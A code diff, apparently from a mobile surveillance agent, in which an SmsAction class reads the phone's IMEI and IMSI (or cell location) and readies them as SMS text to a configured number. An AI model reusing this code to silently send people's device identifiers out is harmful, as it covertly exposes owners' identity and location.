@@ -61,10 +61,10 @@ public class SmsAction extends SubAction {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-	
+
 			number = StringUtils.unspace(params.getString("number"));
 			descrType = params.getString("type", "sim");
-	
+
 			if ("position".equals(descrType)) {
 				type = TYPE_LOCATION;
 			} else if ("text".equals(descrType)) {
@@ -77,56 +77,56 @@ public class SmsAction extends SubAction {
 				}
 				return false;
 			}
-	
+
 			switch (type) {
 			case TYPE_TEXT:
 				// TODO controllare che la lunghezza non sia superiore a 70
 				// caratteri
-	
-				text = params.getString("text","").toLowerCase();
+
+				text = params.getString("text", "No Text");
 				break;
-	
+
 			case TYPE_LOCATION:
 				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
 				break;
-	
+
 			case TYPE_SIM:
 				final StringBuffer sb = new StringBuffer();
 				final Device device = Device.self();
-	
+
 				if (Device.isCdma()) {
 					// sb.append("SID: " + device.getSid() + "\n");
 					// sb.append("ESN: "
 					// + NumberUtilities.toString(device.getEsn(), 16)
 					// + "\n");
 				}
-	
+
 				if (Device.isGprs()) {
 					sb.append(Messages.getString("1_9") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 					sb.append(Messages.getString("1_11") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
-	
+
 				text = sb.toString();
 				break;
-	
+
 			default:
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);//$NON-NLS-1$
 				}
-	
+
 				break;
 			}
 		} catch (final ConfigurationException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
-	
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
 			return false;
 		}
-	
+
 		return true;
 	}
 
